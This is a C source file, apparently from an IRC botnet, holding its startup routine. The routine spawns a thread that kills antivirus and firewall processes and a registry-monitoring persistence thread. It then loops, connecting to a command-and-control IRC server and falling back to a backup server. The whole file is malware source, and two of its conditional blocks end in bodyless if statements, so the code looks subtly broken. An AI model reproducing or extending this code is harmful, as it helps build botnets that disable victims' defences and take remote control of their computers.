#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

// globals
IRC mainirc;
BOOL success = FALSE;
int current_version = 0;

int IRC_Startup(void)
{
	char logbuf[LOGLINE];
	int i = 0, err = 0;
	DWORD id=0;
	BOOL bkpserver = FALSE;
	started = GetTickCount() / 1000;
	srand(GetTickCount());

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0) 
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		return 0;
	}

	#ifndef NO_PROCESS
    #ifndef NO_AVFW_KILL
	sprintf(logbuf,"[PROCS]: AV/FW Killer active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &KillAVThread, (LPVOID)i, 0, &id)) == NULL)
    #endif
	#endif

    #ifndef NO_REGISTRY
	sprintf(logbuf,"[SECURE]: Registry monitor active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistryThread, (LPVOID)i, 0, &id)) == NULL)
    #endif

    current_version=rand()%(versionsize);
	_snprintf(mainirc.host, sizeof(mainirc.host), server);
	mainirc.port = port;
	_snprintf(mainirc.channel, sizeof(mainirc.channel), channel);
	_snprintf(mainirc.chanpass, sizeof(mainirc.chanpass), chanpass);
	mainirc.clone = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CONNCHECK
			DWORD cstat;
			if (!nowininet) 
				if (!fInternetGetConnectedState(&cstat, 0)) {
					Sleep(30000);
					continue;
				}
			#endif

			success = FALSE;
			if ((err = IRC_Connect((LPVOID)&mainirc)) == 2) 
				break; 

			if (success) 
				i--;
			Sleep(3000);
		}

		if (err == 2) 
			break;

		if (bkpserver) {
			_snprintf(mainirc.host, sizeof(mainirc.host), server);
			mainirc.port = port;
			_snprintf(mainirc.channel, sizeof(mainirc.channel), channel);
			_snprintf(mainirc.chanpass, sizeof(mainirc.chanpass), chanpass);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
			_snprintf(mainirc.host, sizeof(mainirc.host), server2);
			mainirc.port = port2;
			_snprintf(mainirc.channel, sizeof(mainirc.channel), channel2);
			_snprintf(mainirc.chanpass, sizeof(mainirc.chanpass), chanpass2);
			bkpserver = TRUE;
		}
	}
	killthreadall();
	fWSACleanup();
	return 0;
}
